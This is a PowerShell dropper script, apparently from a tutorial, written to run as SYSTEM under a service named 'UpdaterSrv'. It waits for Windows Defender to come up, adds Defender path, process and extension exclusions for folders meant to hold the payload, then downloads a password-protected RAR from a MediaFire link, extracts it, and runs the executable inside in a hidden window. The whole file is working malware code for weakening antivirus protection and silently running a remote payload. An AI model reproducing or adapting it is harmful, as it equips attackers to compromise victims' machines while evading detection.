# ----------------------------------------
# script.ps1 (Optimized for LocalSystem Service Execution)
# This script will be executed with SYSTEM privileges by your UpdaterSrv.
# It adds Windows Defender exclusions and fetches/executes a payload.
# ----------------------------------------
Start-Sleep -Seconds 15

$logPath = "C:\Windows\Temp\boot_execution_log.txt"
$logDirectory = Split-Path $logPath -Parent

# Ensure the log directory exists
if (-not (Test-Path $logDirectory)) {
    New-Item -ItemType Directory -Path $logDirectory -Force | Out-Null
}

# --- NEW ADDITION: Ensure ServicesPipeTimeout is set for reliable service startup ---
$servicesPipeTimeoutPath = "HKLM:\SYSTEM\CurrentControlSet\Control"
$servicesPipeTimeoutName = "ServicesPipeTimeout"
$desiredTimeoutMs = 120000 # 120 seconds (2 minutes) - adjust as needed

Add-Content -Path $logPath -Value "Checking and setting ServicesPipeTimeout in registry..."

try {
    $currentTimeout = Get-ItemProperty -Path $servicesPipeTimeoutPath -Name $servicesPipeTimeoutName -ErrorAction SilentlyContinue
    if (-not $currentTimeout -or $currentTimeout.$servicesPipeTimeoutName -lt $desiredTimeoutMs) {
        Set-ItemProperty -Path $servicesPipeTimeoutPath -Name $servicesPipeTimeoutName -Value $desiredTimeoutMs -Force -ErrorAction Stop
        Add-Content -Path $logPath -Value "ServicesPipeTimeout set to ${desiredTimeoutMs}ms. A reboot is required for this change to fully take effect for service startups."
    } else {
        Add-Content -Path $logPath -Value "ServicesPipeTimeout is already set to $($currentTimeout.$servicesPipeTimeoutName)ms (or higher than desired ${desiredTimeoutMs}ms)."
    }
} catch {
    Add-Content -Path $logPath -Value "Error setting ServicesPipeTimeout: $_"
}
# --- END NEW ADDITION ---

Add-Content -Path $logPath -Value "Script started at $(Get-Date) - Running under SYSTEM account."

# --- Optional: Verify Admin Status (for logging/debugging) ---
function Is-Admin {
    $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($identity)
    return $principal.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
}
if (Is-Admin) {
    Add-Content -Path $logPath -Value "Confirmed: Script is running with Administrator (SYSTEM) privileges."
} else {
    Add-Content -Path $logPath -Value "WARNING: Script is NOT running with Administrator privileges. Commands might fail."
    # This block should ideally not be hit if UpdaterSrv runs as LocalSystem.
}

# --- START: Adaptive Wait for Windows Defender Service to be ready ---
Add-Content -Path $logPath -Value "Waiting for Windows Defender service to be fully ready before adding exclusions..."
$maxAttempts = 20 # Check up to 20 times (20 * 5 seconds = 100 seconds max wait)
$delayBetweenChecks = 5 # seconds between each check

for ($i = 0; $i -lt $maxAttempts; $i++) {
    try {
        # Check if the WinDefend service is running and Real-time Protection is enabled
        $defenderService = Get-Service -Name WinDefend -ErrorAction Stop
        $mpStatus = Get-MpComputerStatus -ErrorAction SilentlyContinue

        if ($defenderService.Status -eq 'Running' -and $mpStatus.RealTimeProtectionEnabled -eq $true) {
            Add-Content -Path $logPath -Value "Windows Defender service is running and Real-time Protection is enabled."
            break # Exit loop if Defender is ready
        }
    } catch {
        # Catch errors if service isn't found or Get-MpComputerStatus fails
        Add-Content -Path $logPath -Value "Attempt $($i+1): Defender service not yet found or ready. Error: $_. Waiting..."
    }
    
    # If not ready, wait and try again
    Start-Sleep -Seconds $delayBetweenChecks

    if ($i -eq ($maxAttempts - 1)) {
        # This is the last attempt, log a warning if still not ready
        Add-Content -Path $logPath -Value "WARNING: Max attempts reached. Defender may not be fully ready. Proceeding with exclusions anyway."
    }
}
Add-Content -Path $logPath -Value "Finished adaptive wait. Proceeding with Defender exclusions."
# --- END: Adaptive Wait ---

# --- Add Windows Defender Exclusions ---
Add-Content -Path $logPath -Value "Attempting to add Windows Defender exclusions."

$exclusions = @(
    "C:\Users\Public\SystemLib",
    "C:\Windows\Temp\updater.exe",
    "C:\ProgramData\WinKit"
)

foreach ($excl in $exclusions) {
    try {
        $currentExclusions = Get-MpPreference
        
        # Check if exclusion path already exists
        $pathExists = ($currentExclusions.ExclusionPath | Where-Object { $_ -eq $excl }) -ne $null
        # Check if exclusion process already exists
        $processExists = ($currentExclusions.ExclusionProcess | Where-Object { $_ -eq $excl }) -ne $null
        
        # Check for extension if applicable (e.g., for ".exe")
        $ext = [System.IO.Path]::GetExtension($excl).TrimStart(".")
        $extensionExists = $false
        if ($ext) {
            $extensionExists = ($currentExclusions.ExclusionExtension | Where-Object { $_ -eq $ext }) -ne $null
        }

        if (-not ($pathExists -or $processExists -or ($ext -and $extensionExists))) {
            Add-MpPreference -ExclusionPath $excl -ErrorAction SilentlyContinue
            Add-MpPreference -ExclusionProcess $excl -ErrorAction SilentlyContinue
            if ($ext) {
                Add-MpPreference -ExclusionExtension $ext -ErrorAction SilentlyContinue
            }
            Add-Content $logPath "Exclusion added: $excl"
        } else {
            Add-Content $logPath "Exclusion already exists: $excl"
        }
    } catch {
        Add-Content -Path $logPath "Failed to add exclusion: $excl - Error: $_"
    }
}
Add-Content -Path $logPath -Value "Finished attempting to add Windows Defender exclusions."

# --- Fetch and Execute Payload ---
$payloadUrl = "https://www.mediafire.com/file/0l2fx4lerit9mgc/test.rar" # <-- IMPORTANT: REPLACE WITH YOUR ACTUAL PAYLOAD URL
$payloadPath = "C:\Windows\Temp\payload.rar"
$extractPath = "C:\Windows\Temp\PayloadExtracted"
$rarPassword = "SUBSCRIBE" # <-- IMPORTANT: REPLACE WITH YOUR ACTUAL PASSWORD

Add-Content -Path $logPath -Value "Attempting to fetch, extract, and execute payload from $payloadUrl."

try {
    # Ensure payload directory exists
    if (-not (Test-Path (Split-Path $payloadPath -Parent))) {
        New-Item -ItemType Directory -Path (Split-Path $payloadPath -Parent) -Force | Out-Null
    }

    # Ensure extraction directory exists
    if (-not (Test-Path $extractPath)) {
        New-Item -ItemType Directory -Path $extractPath -Force | Out-Null
    }

    # Download the RAR payload
    Invoke-WebRequest -Uri $payloadUrl -OutFile $payloadPath -UseBasicParsing -TimeoutSec 30
    Add-Content -Path $logPath -Value "RAR payload downloaded to $payloadPath."

    # Check for extraction tools (7-Zip or WinRAR)
    $extractTool = $null
    $sevenZipPath = "C:\Program Files\7-Zip\7z.exe"
    $winRarPath = "C:\Program Files\WinRAR\WinRAR.exe"

    if (Test-Path $sevenZipPath) {
        $extractTool = "7zip"
        Add-Content -Path $logPath -Value "7-Zip found at $sevenZipPath."
    } elseif (Test-Path $winRarPath) {
        $extractTool = "winrar"
        Add-Content -Path $logPath -Value "WinRAR found at $winRarPath."
    } else {
        throw "No extraction tool found. Please ensure 7-Zip or WinRAR is installed."
    }

    # Extract the RAR file using the available tool
    if ($extractTool -eq "7zip") {
        $extractCommand = "& `"$sevenZipPath`" x -p`"$rarPassword`" -o`"$extractPath`" `"$payloadPath`" -y"
        Invoke-Expression $extractCommand | Out-Null
        Add-Content -Path $logPath -Value "RAR payload extracted using 7-Zip to $extractPath."
    } elseif ($extractTool -eq "winrar") {
        $extractCommand = "& `"$winRarPath`" x -p`"$rarPassword`" `"$payloadPath`" `"$extractPath`"\ -y"
        Invoke-Expression $extractCommand | Out-Null
        Add-Content -Path $logPath -Value "RAR payload extracted using WinRAR to $extractPath."
    }

    # Find the .exe file in the extracted directory
    $exeFiles = Get-ChildItem -Path $extractPath -Filter "*.exe" -File -Recurse
    if ($exeFiles.Count -eq 1) {
        $exePath = $exeFiles[0].FullName
        Add-Content -Path $logPath -Value "Found executable: $exePath."

        # Execute the .exe silently
        Start-Process -FilePath $exePath -WindowStyle Hidden
        Add-Content -Path $logPath -Value "Payload executed successfully."
    } elseif ($exeFiles.Count -eq 0) {
        throw "No .exe file found in the extracted payload."
    } else {
        throw "Multiple .exe files found in the extracted payload. Only one is allowed."
    }

} catch {
    Add-Content -Path $logPath -Value "Failed to fetch, extract, or execute payload from $payloadUrl. Error: $_"
}

Add-Content -Path $logPath -Value "Script execution finished at $(Get-Date)."
